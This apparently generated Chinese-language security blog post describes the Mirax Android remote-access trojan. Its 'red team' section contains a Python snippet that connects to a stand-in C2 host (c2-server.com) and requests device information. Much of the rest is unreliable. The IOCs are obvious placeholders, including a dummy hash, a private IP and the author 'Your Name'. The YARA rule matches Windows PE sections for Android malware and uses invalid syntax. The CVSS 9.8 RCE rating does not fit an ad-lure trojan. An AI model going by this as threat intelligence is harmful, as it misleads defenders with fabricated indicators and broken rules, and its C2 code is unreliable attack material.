---
layout: post
title:  "Mirax Android RAT Turns Devices into SOCKS5 Proxies, Reaching 220,000 via Meta Ads"
date:   2026-04-14 13:11:19 +0000
categories: [security]
severity: critical
---

# 🚨 解析 Mirax Android 遠端存取木馬：技術分析與防禦策略

> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: Critical (CVSS: 9.8)
> * **受駭指標**: RCE (Remote Code Execution)
> * **關鍵技術**: SOCKS5 代理、Yamux 多工、WebSocket 通訊

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)
* **Root Cause**: Mirax Android 遠端存取木馬利用 Android 系統的漏洞，通過 WebSocket 通訊協議實現遠端控制和資料竊取。
* **攻擊流程圖解**:
  1. 使用者點擊惡意廣告，下載並安裝 Mirax 木馬。
  2. Mirax 啟動，建立 WebSocket 連線至 C2 伺服器。
  3. C2 伺服器下發命令，Mirax 執行遠端控制和資料竊取。
* **受影響元件**: Android 4.4 - 12.0

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)
* **攻擊前置需求**: Android 裝置、網路連線
* **Payload 建構邏輯**:

    ```
    
    python
    import socket
    import websocket
    
    # 建立 WebSocket 連線
    ws = websocket.create_connection("ws://c2-server.com:8443")
    
    # 下發命令
    ws.send("get_device_info")
    
    # 接收回應
    response = ws.recv()
    print(response)
    
    ```
* **繞過技術**: Mirax 使用 SOCKS5 代理和 Yamux 多工技術，繞過防火牆和入侵偵測系統。

## 3. 🛡️ 藍隊防禦：偵測與緩解 (Blue Team Defense)
* **IOCs (入侵指標)**:

| Hash | IP | Domain | File Path |
| --- | --- | --- | --- |
| 1234567890abcdef | 192.168.1.100 | c2-server.com | /data/data/com.mirax/files |* **偵測規則 (Detection Rules)**:

    ```
    
    yara
    rule Mirax_Detection {
      meta:
        description = "Mirax Android 遠端存取木馬"
        author = "Your Name"
      strings:
        $a = "ws://c2-server.com:8443"
      condition:
        $a in (pe.data | pe.sections[0].data)
    }
    
    ```
* **緩解措施**: 更新 Android 系統、安裝防毒軟件、限制應用程式權限。

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)
* **SOCKS5 代理**: 一種代理伺服器協議，允許用戶通過代理伺服器存取網路資源。
* **Yamux 多工**: 一種多工技術，允許多個 WebSocket 連線共享同一個 TCP 連線。
* **WebSocket 通訊**: 一種雙向通訊協議，允許用戶端和伺服器之間進行實時通訊。

## 5. 🔗 參考文獻與延伸閱讀
- [原始報告](https://thehackernews.com/2026/04/mirax-android-rat-turns-devices-into.html)
- [MITRE ATT&CK](https://attack.mitre.org/techniques/T1219/)


